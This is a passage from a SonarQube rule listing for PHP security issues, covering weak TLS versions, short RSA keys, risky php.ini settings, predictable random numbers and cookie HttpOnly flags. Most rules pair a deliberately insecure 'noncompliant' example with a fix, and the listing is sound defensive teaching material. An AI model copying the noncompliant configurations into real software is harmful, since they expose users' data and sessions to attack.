  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/321" rel="nofollow">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li><li> <a href="https://cwe.mitre.org/data/definitions/322" rel="nofollow">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li><li> <a href="https://cwe.mitre.org/data/definitions/323" rel="nofollow">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li><li> <a href="https://cwe.mitre.org/data/definitions/324" rel="nofollow">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li><li> <a href="https://cwe.mitre.org/data/definitions/325" rel="nofollow">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4423">
              php:S4423
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>To provide communication security over a network, SSL and TLS are generally used. However, it is important to note that the following protocols are
all considered weak by the cryptographic community, and are officially deprecated:</p>
<ul><li> SSL versions 1.0, 2.0 and 3.0 </li><li> TLS versions 1.0 and 1.1 </li></ul>
<p>When these unsecured protocols are used, it is best practice to expect a breach: that a user or organization with malicious intent will perform
mathematical attacks on this data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$opts &#61; array(
  &#39;ssl&#39; &#61;&gt; [
    &#39;crypto_method&#39; &#61;&gt; STREAM_CRYPTO_METHOD_TLSv1_1_CLIENT // Noncompliant
  ],
  &#39;http&#39;&#61;&gt;array(
    &#39;method&#39;&#61;&gt;&#34;GET&#34;
  )
);

$context &#61; stream_context_create($opts);

$fp &#61; fopen(&#39;https://www.example.com&#39;, &#39;r&#39;, false, $context);
fpassthru($fp);
fclose($fp);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$opts &#61; array(
  &#39;ssl&#39; &#61;&gt; [
    &#39;crypto_method&#39; &#61;&gt; STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT
  ],
  &#39;http&#39;&#61;&gt;array(
    &#39;method&#39;&#61;&gt;&#34;GET&#34;
  )
);

$context &#61; stream_context_create($opts);

$fp &#61; fopen(&#39;https://www.example.com&#39;, &#39;r&#39;, false, $context);
fpassthru($fp);
fclose($fp);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, by default you should use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic
community.</p>
<p>The best choices at the moment are the following.</p>
<h4>Use TLS v1.2 or TLS v1.3</h4>
<p>Even though TLS V1.3 is available, using TLS v1.2 is still considered good and secure practice by the cryptography community.<br /></p>
<p>The use of TLS v1.2 ensures compatibility with a wide range of platforms and enables seamless communication between different systems that do not
yet have TLS v1.3 support.</p>
<p>The only drawback depends on whether the framework used is outdated: its TLS v1.2 settings may enable older and insecure cipher suites that are
deprecated as insecure.</p>
<p>On the other hand, TLS v1.3 removes support for older and weaker cryptographic algorithms, eliminates known vulnerabilities from previous TLS
versions, and improves performance.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3337">
              php:S3337
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p><code>enable_dl</code> is on by default and allows <code>open_basedir</code> restrictions, which limit the files a script can access, to be
ignored. For that reason, it’s a dangerous option and should be explicitly turned off.</p>
<p>This rule raises an issue when <code>enable_dl</code> is not explicitly set to 0 in <em>php.ini</em>.</p>
<h3>Noncompliant code example</h3>
<pre>
; php.ini
enable_dl&#61;1  ; Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
; php.ini
enable_dl&#61;0
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/23" rel="nofollow">MITRE, CWE-23</a> - Relative Path Traversal </li><li> <a href="https://cwe.mitre.org/data/definitions/36" rel="nofollow">MITRE, CWE-36</a> - Absolute Path Traversal </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4426">
              php:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul><li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li><li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul><li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li></ul>  </li></ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br /> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
$config &#61; [
    &#34;digest_alg&#34;       &#61;&gt; &#34;sha512&#34;,
    &#34;private_key_bits&#34; &#61;&gt; 1024,                 // Noncompliant
    &#34;private_key_type&#34; &#61;&gt; OPENSSL_KEYTYPE_RSA,
];

$res &#61; openssl_pkey_new($config);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$config &#61; [
    &#34;digest_alg&#34;       &#61;&gt; &#34;sha512&#34;,
    &#34;private_key_bits&#34; &#61;&gt; 2048,
    &#34;private_key_type&#34; &#61;&gt; OPENSSL_KEYTYPE_RSA,
];

$res &#61; openssl_pkey_new($config);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br /> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms are mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC algorithms.</p>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br /> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
&#34;post-quantum&#34;) counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation" rel="nofollow">Learn more here</a>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" rel="nofollow">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths* <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption
  Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ" rel="nofollow">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3334">
              php:S3334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p><code>allow_url_fopen</code> and <code>allow_url_include</code> allow code to be read into a script from URL’s. The ability to suck in executable
code from outside your site, coupled with imperfect input cleansing could lay your site bare to attackers. Even if your input filtering is perfect
today, are you prepared to bet your site that it will always be perfect in the future?</p>
<p>This rule raises an issue when either property is explicitly enabled in <em>php.ini</em> and when <code>allow_url_fopen</code>, which defaults to
enabled, is not explicitly disabled.</p>
<h3>Noncompliant code example</h3>
<pre>
; php.ini  Noncompliant; allow_url_fopen not explicitly disabled
allow_url_include&#61;1  ; Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
; php.ini
allow_url_fopen&#61;0
allow_url_include&#61;0
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/829" rel="nofollow">MITRE, CWE-829</a> - Inclusion of Functionality from Untrusted Control Sphere </li><li> <a href="https://www.sans.org/top25-software-errors/#cat2" rel="nofollow">SANS Top 25</a> - Risky Resource Management </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2245">
              php:S2245
            </a>
          </td>
          <td>
            <details>
              <p>Using pseudorandom number generators (PRNGs) is security-sensitive. For example, it has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2013-6386" rel="nofollow">CVE-2013-6386</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-3419" rel="nofollow">CVE-2006-3419</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2008-4102" rel="nofollow">CVE-2008-4102</a> </li></ul>
<p>When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that
will be generated, and use this guess to impersonate another user or access sensitive information.</p>
<p>As the <code>rand()</code> and <code>mt_rand()</code> functions rely on a pseudorandom number generator, it should not be used for
security-critical applications or for protecting sensitive data.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the code using the generated value requires it to be unpredictable. It is the case for all encryption mechanisms or when a secret value, such
  as a password, is hashed. </li><li> the function you use generates a value which can be predicted (pseudo-random). </li><li> the generated value is used multiple times. </li><li> an attacker can access the generated value. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use functions which rely on a cryptographically strong random number generator such as <code>random_int()</code> or <code>random_bytes()</code>
  or <code>openssl_random_pseudo_bytes()</code> </li><li> When using <code>openssl_random_pseudo_bytes()</code>, provide and check the <code>crypto_strong</code> parameter </li><li> Use the generated random values only once. </li><li> You should not expose the generated random value. If you have to store it, make sure that the database or file is secure. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
$random &#61; rand();
$random2 &#61; mt_rand(0, 99);
</pre>
<h2>Compliant Solution</h2>
<pre>
$randomInt &#61; random_int(0,99); // Compliant; generates a cryptographically secure random integer
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements" rel="nofollow">Mobile AppSec
  Verification Standard</a> - Cryptography Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography" rel="nofollow">OWASP Mobile Top 10 2016 Category M5</a> -
  Insufficient Cryptography </li><li> <a href="https://cwe.mitre.org/data/definitions/338" rel="nofollow">MITRE, CWE-338</a> - Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)
  </li><li> <a href="https://cwe.mitre.org/data/definitions/330" rel="nofollow">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li><li> <a href="https://cwe.mitre.org/data/definitions/326" rel="nofollow">MITRE, CWE-326</a> - Inadequate Encryption Strength </li><li> <a href="https://cwe.mitre.org/data/definitions/1241" rel="nofollow">MITRE, CWE-1241</a> - Use of Predictable Algorithm in Random Number Generator </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#PREDICTABLE_RANDOM" rel="nofollow">Predictable Pseudo Random Number
  Generator</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3335">
              php:S3335
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The <code>cgi.force_redirect</code> <em>php.ini</em> configuration is on by default, and it prevents unauthenticated access to scripts when PHP is
running as a CGI. Unfortunately, it must be disabled on IIS, OmniHTTPD and Xitami, but in all other cases it should be on.</p>
<p>This rule raises an issue when when <code>cgi.force_redirect</code> is explicitly disabled.</p>
<h3>Noncompliant code example</h3>
<pre>
; php.ini
cgi.force_redirect&#61;0  ; Noncompliant
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/305" rel="nofollow">MITRE, CWE-305</a> - Authentication Bypass by Primary Weakness </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3332">
              php:S3332
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p>Cookies without fixed lifetimes or expiration dates are known as non-persistent, or &#34;session&#34; cookies, meaning they last only as long as the
browser session, and poof away when the browser closes. Cookies with expiration dates, &#34;persistent&#34; cookies, are stored/persisted until those
dates.</p>
<p>Non-persistent cookies should be used for the management of logged-in sessions on web sites. To make a cookie non-persistent, simply omit the
<code>expires</code> attribute.</p>
<p>This rule raises an issue when <code>expires</code> is set for a session cookie, either programmatically or via configuration, such as
<code>session.cookie_lifetime</code>.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#expire-and-max-age-attributes" rel="nofollow">OWASP, Session
  Management Cheat Sheet</a> - Expire and Max-Age Attributes </li><li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#COOKIE_PERSISTENT" rel="nofollow">COOKIE_PERSISTENT</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3333">
              php:S3333
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The <code>open_basedir</code> configuration in <em>php.ini</em> limits the files the script can access using, for example, <code>include</code> and
<code>fopen()</code>. Leave it out, and there is no default limit, meaning that any file can be accessed. Include it, and PHP will refuse to access
files outside the allowed path.</p>
<p><code>open_basedir</code> should be configured with a directory, which will then be accessible recursively. However, the use of <code>.</code>
(current directory) as an <code>open_basedir</code> value should be avoided since it’s resolved dynamically during script execution, so a
<code>chdir(&#39;/&#39;)</code> command could lay the whole server open to the script.</p>
<p>This is not a fool-proof configuration; it can be reset or overridden at the script level. But its use should be seen as a minimum due diligence
step. This rule raises an issue when <code>open_basedir</code> is not present in <em>php.ini</em>, and when <code>open_basedir</code> contains root,
or the current directory (<code>.</code>) symbol.</p>
<h3>Noncompliant code example</h3>
<pre>
; php.ini try 1
; open_basedir&#61;&#34;${USER}/scripts/data&#34;  Noncompliant; commented out

; php.ini try 2
open_basedir&#61;&#34;/:${USER}/scripts/data&#34;  ; Noncompliant; root directory in the list
</pre>
<h3>Compliant solution</h3>
<pre>
; php.ini try 1
open_basedir&#61;&#34;${USER}/scripts/data&#34;
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/23" rel="nofollow">MITRE, CWE-23</a> - Relative Path Traversal </li><li> <a href="https://cwe.mitre.org/data/definitions/36" rel="nofollow">MITRE, CWE-36</a> - Absolute Path Traversal </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3330">
              php:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li><li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li></ul>
<h2>Sensitive Code Example</h2>
<p>In <em>php.ini</em> you can specify the flags for the session cookie which is security-sensitive:</p>
<pre>
session.cookie_httponly &#61; 0;  // Sensitive: this sensitive session cookie is created with the httponly flag set to false and so it can be stolen easily in case of XSS vulnerability
</pre>
<p>Same thing in PHP code:</p>
<pre>
session_set_cookie_params($lifetime, $path, $domain, true, false);  // Sensitive: this sensitive session cookie is created with the httponly flag (the fifth argument) set to false and so it can be stolen easily in case of XSS vulnerability
</pre>
<p>If you create a custom security-sensitive cookie in your PHP code:</p>
<pre>
$value &#61; &#34;sensitive data&#34;;
setcookie($name, $value, $expire, $path, $domain, true, false); // Sensitive: this sensitive cookie is created with the httponly flag (the seventh argument) set to false  and so it can be stolen easily in case of XSS vulnerability
</pre>
<p>By default <a href="https://www.php.net/manual/en/function.setcookie.php" rel="nofollow"><code>setcookie</code></a> and <a href="https://www.php.net/manual/en/function.setrawcookie.php" rel="nofollow"><code>setrawcookie</code></a> functions set <code>httpOnly</code> flag to
<em>false</em> (the seventh argument) and so cookies can be stolen easily in case of XSS vulnerability:</p>
<pre>
$value &#61; &#34;sensitive data&#34;;
setcookie($name, $value, $expire, $path, $domain, true); // Sensitive: a sensitive cookie is created with the httponly flag  (the seventh argument) not defined (by default set to false)
setrawcookie($name, $value, $expire, $path, $domain, true); // Sensitive: a sensitive cookie is created with the httponly flag (the seventh argument) not defined  (by default set to false)
</pre>
<h2>Compliant Solution</h2>
<pre>
session.cookie_httponly &#61; 1; // Compliant: the sensitive cookie is protected against theft thanks (cookie_httponly&#61;1)
</pre>
<pre>
session_set_cookie_params($lifetime, $path, $domain, true, true); // Compliant: the sensitive cookie is protected against theft thanks to the fifth argument set to true (HttpOnly&#61;true)
</pre>
<pre>
$value &#61; &#34;sensitive data&#34;;
setcookie($name, $value, $expire, $path, $domain, true, true); // Compliant: the sensitive cookie is protected against theft thanks to the seventh argument set to true (HttpOnly&#61;true)
setrawcookie($name, $value, $expire, $path, $domain, true, true); // Compliant: the sensitive cookie is protected against theft thanks to the seventh argument set to true (HttpOnly&#61;true)
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-community/HttpOnly" rel="nofollow">OWASP HttpOnly</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
